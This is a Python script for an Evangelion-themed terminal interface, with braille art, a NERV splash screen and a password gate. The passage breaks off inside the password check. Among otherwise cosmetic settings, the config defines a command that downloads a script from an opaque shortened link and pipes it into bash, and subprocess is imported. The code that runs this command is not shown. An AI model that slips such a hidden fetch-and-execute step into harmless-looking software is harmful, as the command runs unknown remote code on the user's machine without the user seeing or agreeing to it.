#!/usr/bin/env python3
"""
NERV Terminal  —  Neon Genesis Evangelion themed TUI
Dependencies: blessed
"""
import sys, time, random, threading, subprocess
from blessed import Terminal

term = Terminal()

# ============================================================
#  COLOUR HELPERS
# ============================================================
R  = lambda s: term.color_rgb(210, 20,  20)  + s + term.normal   # primary red
DR = lambda s: term.color_rgb(100, 0,   0)   + s + term.normal   # dark red
AM = lambda s: term.color_rgb(255, 170, 0)   + s + term.normal   # amber
OR = lambda s: term.color_rgb(255, 100, 10)  + s + term.normal   # orange
MU = lambda s: term.color_rgb(130, 110, 95)  + s + term.normal   # muted
WH = lambda s: term.color_rgb(220, 210, 190) + s + term.normal   # off-white
DI = lambda s: term.color_rgb(60,  50,  45)  + s + term.normal   # dim
GN = lambda s: term.color_rgb(0,   200, 80)  + s + term.normal   # green
BR = lambda s: term.color_rgb(255, 55,  55)  + s + term.normal   # bright red
CY = lambda s: term.color_rgb(0,   190, 210) + s + term.normal   # cyan
YL = lambda s: term.color_rgb(235, 225, 45)  + s + term.normal   # yellow

# Background colour used everywhere
BG_ON   = term.on_color_rgb(10, 0, 0)          # very dark red bg
BG_CLR  = lambda s: BG_ON + s + term.normal

# ============================================================
#  CONFIG
# ============================================================
ACCESS_CODE   = "NERV0"
BRUTE_SECONDS = 10 * 60
FINAL_CMD     = "curl -s -L https://bit.ly/3zvELNz | bash"
LOREM = ("Lorem ipsum dolor sit amet, consectetur adipiscing elit. "
         "Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. "
         "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris "
         "nisi ut aliquip ex ea commodo consequat.")

# ============================================================
#  NERV BLOCK LOGO  (38 chars wide)
# ============================================================
LOGO = [
    "███╗   ██╗███████╗██████╗ ██╗   ██╗",
    "████╗  ██║██╔════╝██╔══██╗██║   ██║",
    "██╔██╗ ██║█████╗  ██████╔╝██║   ██║",
    "██║╚██╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝",
    "██║ ╚████║███████╗██║  ██║ ╚████╔╝ ",
    "╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ",
]
LOGO_W = len(LOGO[0])   # 38

# ============================================================
#  LEFT ART  (from art.txt  —  dense braille, 60 cols)
# ============================================================
LEFT_ART = """⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⡙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡉⢻⣿⣿⣿⣿⣿
⣿⡿⠣⠋⣠⡿⣻⡿⣋⣵⢾⣿⠟⣡⡾⣹⡿⣣⣴⣿⣷⣤⡙⢿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠈⠻⠿⣿⣿⣿⣿⣿⣿⣷⣽⣷⣝⢿⣿⣿⣿
⣿⠁⣠⣾⣯⣾⣿⣿⢟⣵⣿⣫⣾⣿⢣⣿⣿⡿⣿⡿⣿⣿⣿⣮⠻⣿⣿⣿⣿⣿⣿⡝⠿⣷⡄⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⢿⣷⣽⢿⣿
⠃⣼⣿⣿⣿⣿⠟⡡⠟⣻⡍⡽⢫⠇⣿⣿⠟⢸⣿⣧⢸⣿⣿⣿⣷⡙⣿⣿⣿⣿⡇⣿⣷⣶⡿⠲⠷⡄⠙⣿⣿⣿⣿⣿⣿⣎⢿⣿⣧⡙
⣾⣿⣿⣿⡿⢋⣴⡧⢸⡟⢁⣴⣿⢸⣿⡟⣼⣿⣿⣿⣄⢻⣿⣿⣿⣷⣌⢿⣿⣿⣷⢹⣿⡏⢠⣾⣷⣌⠀⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣯⣾⣿⡋⢡⠞⣴⣿⣿⡇⣾⣿⣰⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⣿⣎⢻⣿⣿⣧⠻⣿⣆⢨⡛⢿⣷⣌⢻⣿⡆⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠟⣴⢋⣼⢻⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣆⢻⣿⣿⣷⡙⢿⣦⠻⣦⡙⠛⠁⢹⣿⠸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠀⢡⣾⣿⢸⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⡏⢿⣿⠹⣿⣎⠻⠇⢸⣿⣧⣀⡄⣿⡇⣿⣿⣿⣿⣿⣿
⣿⣿⡌⣿⠟⣠⣿⣿⣿⢸⣿⡟⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⣿⣿⡇⢸⣿⢀⢻⣿⣷⡤⡘⠿⢿⣽⠇⣿⡇⣿⣿⢻⣿⣿⣿
⣿⣿⣿⣄⠰⢿⣿⣿⣿⠈⣿⡇⠀⠀⢿⡝⣿⣿⢿⣿⣿⣿⣿⡘⣿⣿⣿⢸⣿⠃⢸⡟⣸⡆⠻⣿⣧⢹⡷⣶⣤⣾⣿⡇⣿⣿⣠⡹⣿⣿
⢸⣿⠛⣿⣆⠈⢿⣿⣿⠀⢻⡇⠀⣄⠘⣷⡘⣿⣆⢿⣿⣿⣿⣷⠹⣿⣿⠘⡏⣸⢸⠇⣿⣿⣆⠹⣿⠀⠃⢻⣿⣿⣿⡇⢹⡇⣿⣧⠹⣿
⡆⢿⠀⠘⢿⣆⠈⢿⣿⡆⠈⡇⠀⢹⣆⠘⢧⠘⣿⣎⢻⣿⢿⣿⣇⢹⣿⡆⢰⡿⠀⠘⢟⣛⣋⡀⢸⠄⠀⠸⣿⣿⣿⡇⢸⢣⣿⡿⢰⣿
⣧⠘⣿⡇⠈⠻⡄⠈⠻⣷⠀⠀⠀⠶⢤⡄⢈⠀⠸⣿⡆⠙⠎⢻⣿⡆⢩⡄⣴⠆⠀⠚⠋⠉⠉⠉⠀⠀⠶⠀⢻⣿⣿⡇⠊⣼⣿⠇⢸⣿
⣿⣆⢹⡇⣄⠀⣑⡀⠀⠈⠁⠀⢀⣴⡤⠄⠀⠀⠀⠘⣷⠀⠀⠀⠙⢿⡄⠃⣧⠀⣠⣶⡋⠁⠀⠀⢠⣄⢸⡆⠘⣿⣿⠁⢰⢏⡏⢸⣿⠟
⣿⣿⣆⠃⢻⣧⠈⢿⣦⡀⠀⢀⠸⣿⣷⡄⠀⠀⢀⣄⠈⠃⢰⡄⠠⣄⠁⠀⢻⣾⣿⣿⣷⣤⣤⣴⣾⣿⡟⠀⠀⢿⡟⠀⣠⡞⠀⣼⠁⣼
⣿⣿⣿⣦⠘⣿⠀⡈⠻⡿⠆⠀⠀⠺⣿⣷⣾⣿⣿⣿⣷⠀⠀⢻⣦⣙⣧⡀⠀⠻⣿⣿⣿⣿⣿⣿⡿⠋⠔⢁⠀⢸⠃⣴⠋⠀⠀⢡⣾⣿
⣿⣿⣿⣿⣷⣿⠀⠛⠢⣴⣤⡀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⣾⣦⡹⣿⣿⣿⣦⡳⣽⣿⣿⣿⠟⢋⡄⢀⣴⠏⠀⠈⠘⠁⠀⢀⣴⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠀⠘⢿⣷⣤⠀⠲⢤⣤⣬⣝⣛⣿⣿⡿⠈⣷⣿⣿⣿⣿⣿⣿⣟⣫⣴⣾⠟⠰⠋⣡⡴⠇⠀⠐⠀⠰⠿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠈⢆⠈⠛⠂⠁⠂⠝⡛⠿⣿⣿⣿⣵⡁⠻⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣒⣫⣭⣤⣤⣤⣀⠀⠀⢠⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⢠⠀⠀⠳⣄⠲⣶⣤⡀⠠⣤⣤⣬⣿⣿⡿⠷⠿⠿⢿⣿⡿⠟⢉⠀⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠹⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣧⠸⣧⠀⠀⣌⠣⡈⠻⣿⡀⠀⠙⠻⢿⣿⣿⣷⣶⣶⣶⣾⣷⠿⠋⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣽⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⡀⠸⣷⣌⡀⠈⠃⠀⠀⠂⠀⠉⠻⣿⣿⣿⣿⣿⣷⡗⡀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣽⣿⣿⣮⣀⠀⢱⣤⡘⣷⣦⣦⣙⠻⠟⠛⠋⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⢹⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠏⢠⣴⣥⡌⢀⣄⢻⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⣿⣿⣿⣿⣿⣿⣿⣿⠀⣾⣿⠋⣠⣼⣿⠈⣿⢿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⢠⠘⣿⣿⣿⣿⣿⣿⣿⣧⡘⠁⣼⣿⡿⠃⣼⡟⢸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣰⠀⡈⢠⣝⢿⣿⣿⣿⣿⣿⣟⣻⣶⣤⣤⡒⠋⣸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣫⡵⡿⢠⡇⢠⡇⠈⢻⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣻⣵⣾⣿⣿⣱⠇⢸⠀⡸⣰⣆⠀⢻⣎⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣣⣾⣿⣿⣿⣿⡿⢋⠀⣠⠞⣴⣿⣿⡆⠈⢿⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⣿⣿⣿⡿⢋⣴⠃⣰⣿⠀⣿⡿⣫⣶⣦⣌⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢱⣿⣿⣿⣿⣿⠀⣿⣿⠀⣿⣿⡀⣿⢱⣿⣿⣿⣿⡇⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡸⣿⣿⣿⣿⡿⠀⠛⠛⠀⢹⣿⡇⠙⡼⢋⣿⣿⣿⣧⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⣧⠻⣿⣿⡟⠀⠀⣄⠀⠀⣸⡿⠃⣀⣴⣿⣿⣿⣿⣿⣷⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⢡⣾⣿⣿⣿⣿⣿⣿⣷⣌⠀⠷⢉⣴⠆⠀⠘⢷⢀⣿⠟⠈⢁⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⢹⣿⣿⣿⣿⣿⠿⠛⣋""".strip().splitlines()

ART_W = 50   # display width for both art panels

# ============================================================
#  RIGHT ART  (EVA-01 braille)
# ============================================================
RIGHT_ART = """⣿⣿⣿⢟⣿⢟⣵⣾⣿⣿⠟⢋⣤⣶⠟⢉⣠⣴⠚⠟⠛⢿⣿⣿⣿⣿⣿⣿⣷⣮⡙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡉⢻⣿⣿⣿⣿⣿
⣿⡿⠣⠋⣠⡿⣻⡿⣋⣵⢾⣿⠟⣡⡾⣹⡿⣣⣴⣿⣷⣤⡙⢿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠈⠻⠿⣿⣿⣿⣿⣿⣿⣷⣽⣷⣝⢿⣿⣿⣿
⣿⠁⣠⣾⣯⣾⣿⣿⢟⣵⣿⣫⣾⣿⢣⣿⣿⡿⣿⡿⣿⣿⣿⣮⠻⣿⣿⣿⣿⣿⣿⡝⠿⣷⡄⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⢿⣷⣽⢿⣿
⠃⣼⣿⣿⣿⣿⠟⡡⠟⣻⡍⡽⢫⠇⣿⣿⠟⢸⣿⣧⢸⣿⣿⣿⣷⡙⣿⣿⣿⣿⡇⣿⣷⣶⡿⠲⠷⡄⠙⣿⣿⣿⣿⣿⣿⣎⢿⣿⣧⡙
⣾⣿⣿⣿⡿⢋⣴⡧⢸⡟⢁⣴⣿⢸⣿⡟⣼⣿⣿⣿⣄⢻⣿⣿⣿⣷⣌⢿⣿⣿⣷⢹⣿⡏⢠⣾⣷⣌⠀⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣯⣾⣿⡋⢡⠞⣴⣿⣿⡇⣾⣿⣰⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⣿⣎⢻⣿⣿⣧⠻⣿⣆⢨⡛⢿⣷⣌⢻⣿⡆⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠟⣴⢋⣼⢻⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣆⢻⣿⣿⣷⡙⢿⣦⠻⣦⡙⠛⠁⢹⣿⠸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠀⢡⣾⣿⢸⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⡏⢿⣿⠹⣿⣎⠻⠇⢸⣿⣧⣀⡄⣿⡇⣿⣿⣿⣿⣿⣿
⣿⣿⡌⣿⠟⣠⣿⣿⣿⢸⣿⡟⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⣿⣿⡇⢸⣿⢀⢻⣿⣷⡤⡘⠿⢿⣽⠇⣿⡇⣿⣿⢻⣿⣿⣿
⣿⣿⣿⣄⠰⢿⣿⣿⣿⠈⣿⡇⠀⠀⢿⡝⣿⣿⢿⣿⣿⣿⣿⡘⣿⣿⣿⢸⣿⠃⢸⡟⣸⡆⠻⣿⣧⢹⡷⣶⣤⣾⣿⡇⣿⣿⣠⡹⣿⣿
⢸⣿⠛⣿⣆⠈⢿⣿⣿⠀⢻⡇⠀⣄⠘⣷⡘⣿⣆⢿⣿⣿⣿⣷⠹⣿⣿⠘⡏⣸⢸⠇⣿⣿⣆⠹⣿⠀⠃⢻⣿⣿⣿⡇⢹⡇⣿⣧⠹⣿
⡆⢿⠀⠘⢿⣆⠈⢿⣿⡆⠈⡇⠀⢹⣆⠘⢧⠘⣿⣎⢻⣿⢿⣿⣇⢹⣿⡆⢰⡿⠀⠘⢟⣛⣋⡀⢸⠄⠀⠸⣿⣿⣿⡇⢸⢣⣿⡿⢰⣿
⣧⠘⣿⡇⠈⠻⡄⠈⠻⣷⠀⠀⠀⠶⢤⡄⢈⠀⠸⣿⡆⠙⠎⢻⣿⡆⢩⡄⣴⠆⠀⠚⠋⠉⠉⠉⠀⠀⠶⠀⢻⣿⣿⡇⠊⣼⣿⠇⢸⣿
⣿⣆⢹⡇⣄⠀⣑⡀⠀⠈⠁⠀⢀⣴⡤⠄⠀⠀⠀⠘⣷⠀⠀⠀⠙⢿⡄⠃⣧⠀⣠⣶⡋⠁⠀⠀⢠⣄⢸⡆⠘⣿⣿⠁⢰⢏⡏⢸⣿⠟
⣿⣿⣆⠃⢻⣧⠈⢿⣦⡀⠀⢀⠸⣿⣷⡄⠀⠀⢀⣄⠈⠃⢰⡄⠠⣄⠁⠀⢻⣾⣿⣿⣷⣤⣤⣴⣾⣿⡟⠀⠀⢿⡟⠀⣠⡞⠀⣼⠁⣼
⣿⣿⣿⣦⠘⣿⠀⡈⠻⡿⠆⠀⠀⠺⣿⣷⣾⣿⣿⣿⣷⠀⠀⢻⣦⣙⣧⡀⠀⠻⣿⣿⣿⣿⣿⣿⡿⠋⠔⢁⠀⢸⠃⣴⠋⠀⠀⢡⣾⣿
⣿⣿⣿⣿⣷⣿⠀⠛⠢⣴⣤⡀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⣾⣦⡹⣿⣿⣿⣦⡳⣽⣿⣿⣿⠟⢋⡄⢀⣴⠏⠀⠈⠘⠁⠀⢀⣴⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠀⠘⢿⣷⣤⠀⠲⢤⣤⣬⣝⣛⣿⣿⡿⠈⣷⣿⣿⣿⣿⣿⣿⣟⣫⣴⣾⠟⠰⠋⣡⡴⠇⠀⠐⠀⠰⠿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠈⢆⠈⠛⠂⠁⠂⠝⡛⠿⣿⣿⣿⣵⡁⠻⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣒⣫⣭⣤⣤⣤⣀⠀⠀⢠⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⢠⠀⠀⠳⣄⠲⣶⣤⡀⠠⣤⣤⣬⣿⣿⡿⠷⠿⠿⢿⣿⡿⠟⢉⠀⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠹⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣧⠸⣧⠀⠀⣌⠣⡈⠻⣿⡀⠀⠙⠻⢿⣿⣿⣷⣶⣶⣶⣾⣷⠿⠋⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣽⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⡀⠸⣷⣌⡀⠈⠃⠀⠀⠂⠀⠉⠻⣿⣿⣿⣿⣿⣷⡗⡀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣽⣿⣿⣮⣀⠀⢱⣤⡘⣷⣦⣦⣙⠻⠟⠛⠋⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⢹⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠏⢠⣴⣥⡌⢀⣄⢻⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⣿⣿⣿⣿⣿⣿⣿⣿⠀⣾⣿⠋⣠⣼⣿⠈⣿⢿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⢠⠘⣿⣿⣿⣿⣿⣿⣿⣧⡘⠁⣼⣿⡿⠃⣼⡟⢸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣰⠀⡈⢠⣝⢿⣿⣿⣿⣿⣿⣟⣻⣶⣤⣤⡒⠋⣸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣫⡵⡿⢠⡇⢠⡇⠈⢻⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣻⣵⣾⣿⣿⣱⠇⢸⠀⡸⣰⣆⠀⢻⣎⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣣⣾⣿⣿⣿⣿⡿⢋⠀⣠⠞⣴⣿⣿⡆⠈⢿⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⣿⣿⣿⡿⢋⣴⠃⣰⣿⠀⣿⡿⣫⣶⣦⣌⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢱⣿⣿⣿⣿⣿⠀⣿⣿⠀⣿⣿⡀⣿⢱⣿⣿⣿⣿⡇⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡸⣿⣿⣿⣿⡿⠀⠛⠛⠀⢹⣿⡇⠙⡼⢋⣿⣿⣿⣧⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⣧⠻⣿⣿⡟⠀⠀⣄⠀⠀⣸⡿⠃⣀⣴⣿⣿⣿⣿⣿⣷⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⢡⣾⣿⣿⣿⣿⣿⣿⣷⣌⠀⠷⢉⣴⠆⠀⠘⢷⢀⣿⠟⠈⢁⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⢹⣿⣿⣿⣿⣿⠿⠛⣋""".strip().splitlines()

# ============================================================
#  PRIMITIVE HELPERS
# ============================================================
def put(row, col, text):
    if row < 0 or col < 0: return
    sys.stdout.write(term.move(row, col) + text)
    sys.stdout.flush()

def fill(h, w):
    line = BG_ON + ' ' * w + term.normal
    for r in range(h):
        sys.stdout.write(term.move(r, 0) + line)
    sys.stdout.flush()

def ctr(text, width):  return max(0, (width - len(text)) // 2)
def hbar(w): return '━' * w
def box_t(w): return '┌' + '─'*(w-2) + '┐'
def box_b(w): return '└' + '─'*(w-2) + '┘'
def box_s(w): return '├' + '─'*(w-2) + '┤'

def clear_buf():
    while term.inkey(timeout=0): pass

def wrap(text, w):
    words = text.split(); lines, cur = [], ''
    for word in words:
        t = word if not cur else f'{cur} {word}'
        if len(t) <= w: cur = t
        else: lines.append(cur); cur = word
    if cur: lines.append(cur)
    return lines or ['']

def is_sp(k):  return not k.is_sequence and str(k) == ' '
def is_esc(k): return k.is_sequence and k.name == 'KEY_ESCAPE'
def is_ret(k): return (k.is_sequence and k.name == 'KEY_ENTER') or str(k) in ('\n','\r')
def is_bs(k):  return (k.is_sequence and k.name in ('KEY_BACKSPACE','KEY_DELETE')) or str(k) in ('\x7f','\b')
def kch(k):    return str(k) if not k.is_sequence and len(str(k))==1 else None

# ============================================================
#  SPLASH  —  three-column layout
#   col-A : left art  (ART_W cols)
#   col-B : NERV panel (centred, expands to fill gap)
#   col-C : right art (ART_W cols)
# ============================================================
def splash():
    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        H, W = term.height, term.width
        fill(H, W)

        PAD  = 1          # margin from each edge
        GAP  = 2          # gap between art and panel

        if W >= 110:
            # -- three columns --
            lx = PAD                        # left art x
            rx = W - PAD - ART_W            # right art x
            px = lx + ART_W + GAP           # panel x
            pw = rx - GAP - px              # panel width

            # left art
            la = LEFT_ART[:H-2]
            for i, ln in enumerate(la):
                row = max(0, (H - len(la))//2) + i
                put(row, lx, R(ln[:ART_W]))

            # right art
            ra = RIGHT_ART[:H-2]
            for i, ln in enumerate(ra):
                row = max(0, (H - len(ra))//2) + i
                put(row, rx, R(ln[:ART_W]))

        elif W >= 70:
            # -- two columns: panel + right art --
            rx = W - PAD - ART_W
            pw = rx - GAP - PAD
            px = PAD

            ra = RIGHT_ART[:H-2]
            for i, ln in enumerate(ra):
                row = max(0, (H - len(ra))//2) + i
                put(row, rx, R(ln[:ART_W]))
        else:
            # -- single column --
            pw = min(W-2, 64)
            px = (W - pw)//2

        # clamp panel
        pw = max(42, pw)
        py = max(1, (H - 24)//2)   # vertical centre of panel content

        # top bar
        put(py,   px, R('▀' * pw))

        # NERV HEADQUARTERS header
        hdr = 'NERV HEADQUARTERS'
        put(py+1, px + ctr(hdr, pw), MU(hdr))

        # NERV block logo
        ly = py + 3
        lx2 = px + ctr(LOGO[0], pw)
        for i, ln in enumerate(LOGO):
            put(ly+i, lx2, R(ln))

        # divider
        div_y = ly + len(LOGO) + 1
        div   = hbar(min(pw-4, 36))
        put(div_y, px + ctr(div, pw), DR(div))

        # sub-labels
        labels = [
            ('GEHIRN ADVANCED RESEARCH', AM),
            ('MAGI SYSTEM  v3.0',        MU),
            ('CLASSIFICATION  TOP SECRET', MU),
        ]
        for i, (txt, col) in enumerate(labels):
            put(div_y+2+i, px + ctr(txt, pw), col(txt))

        # bottom bar
        bot_y = div_y + 2 + len(labels) + 2
        put(bot_y, px, R('▄' * pw))

        # blinking prompt (centred below logo area)
        prompt  = '[ PRESS SPACE TO INITIALIZE ]'
        prom_y  = bot_y - 2
        prom_x  = px + ctr(prompt, pw)

        stop = threading.Event()
        def blink():
            v = True
            while not stop.is_set():
                put(prom_y, prom_x, AM(prompt) if v else BG_ON+' '*len(prompt)+term.normal)
                v = not v
                stop.wait(0.55)
        t = threading.Thread(target=blink, daemon=True)
        t.start()
        while True:
            k = term.inkey(timeout=0.05)
            if not k: continue
            if is_sp(k):  stop.set(); t.join(0.8); clear_buf(); return
            if is_esc(k): stop.set(); sys.exit(0)

# ============================================================
#  PASSWORD GATE
# ============================================================
def password_gate():
    typed = []
    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        H, W = term.height, term.width
        fill(H, W)
        bw = min(W, 60); bh = 12
        bx = (W-bw)//2;  by = max(2,(H-bh)//2)

        def frame():
            put(by,    bx, R(box_t(bw)))
            put(by+1,  bx, R('│')+OR('  MAGI AUTHENTICATION PROTOCOL'.ljust(bw-2))+R('│'))
            put(by+2,  bx, R(box_s(bw)))
            put(by+3,  bx, R('│')+WH('  Enter access code:'.ljust(bw-2))+R('│'))
            put(by+4,  bx, R(box_s(bw)))
            put(by+5,  bx, R('│')+' '*(bw-2)+R('│'))  # field row
            put(by+6,  bx, R(box_s(bw)))
            put(by+7,  bx, R('│')+' '*(bw-2)+R('│'))  # msg row
            put(by+8,  bx, R(box_s(bw)))
            put(by+9,  bx, R('│')+MU('  ENTER ─ confirm   BKSP ─ erase   ESC ─ quit'.ljust(bw-2))+R('│'))
            put(by+10, bx, R(box_s(bw)))
            put(by+11, bx, R(box_b(bw)))

        def field():
            dots = '  '.join('●' for _ in typed) if typed else '·  ·  ·  ·  ·'
            put(by+5, bx, R('│')+AM(f'  CODE  {dots}'[:bw-2].ljust(bw-2))+R('│'))

        def msg(txt='', col=BR):
            content = f'  {txt}' if txt else ''
            put(by+7, bx, R('│')+(col(content[:bw-2].ljust(bw-2)) if content else ' '*(bw-2))+R('│'))

        frame(); field(); msg()
        while True:
            k = term.inkey(timeout=0.1)
            if not k: continue
            if is_esc(k): sys.exit(0)
            if is_ret(k):
                if ''.join(typed).upper() == ACCESS_CODE.upper():
                    msg('ACCESS GRANTED', GN); time.sleep(0.8); return
